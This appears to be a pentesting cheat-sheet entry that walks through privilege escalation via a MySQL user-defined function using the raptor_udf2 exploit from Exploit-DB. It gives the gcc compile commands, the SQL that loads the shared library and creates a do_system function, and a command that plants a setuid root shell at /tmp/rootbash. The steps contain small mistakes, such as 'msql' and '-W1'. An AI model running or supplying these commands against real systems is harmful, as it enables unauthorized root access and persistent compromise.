# User Defined Functions (UDF)
- [Exploit](https://www.exploit-db.com/exploits/1518)

Conditions
- Service running as root
- Root user for service has no password

1. Compile exploit
```sh
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -W1, -soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

2. Connect to the service as root with a blank password:
```sh
msql -u root
use mysql;
```

3. Create a UDF function 
```sh
create table foo(line blob);
insert into foo values(load_file('raptor_udf2.so'));
select * from foo into dumpfile 'raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
